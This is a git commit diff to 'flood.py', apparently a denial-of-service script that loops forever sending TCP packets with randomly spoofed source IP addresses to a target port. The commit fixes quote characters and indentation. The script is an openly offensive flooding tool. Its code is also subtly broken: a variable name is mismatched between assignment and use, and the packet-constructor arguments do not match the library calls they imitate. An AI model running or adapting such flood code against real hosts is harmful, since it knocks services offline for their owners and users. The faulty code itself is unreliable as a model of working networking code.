c76eac4f014ef310a8f02a8e3d2a4969e7caa8c7
Jesse Huang <jesse.huang1205@gmail.com>
2020-11-28 16:18:48 -0500

    Add files via upload

--- flood.py
+++ flood.py
@@ -9,12 +9,12 @@ while True:
    b = str(random.randint(1,254))
    c = str(random.randint(1,254))
    d = str(random.randint(1,254))
-   dot = “.”
-   
+   dot = '.'
+
    Source_ip = a + dot + b + dot + c + dot + d
    IP1 = IP(source_IP = source_IP, destination = target_IP)
    TCP1 = TCP(srcport = source_port, dstport = 6553)
    pkt = IP1 / TCP1
    send(pkt,inter = .001)
    print ("packet sent ", i)
-      i = i + 1
+   i = i + 1
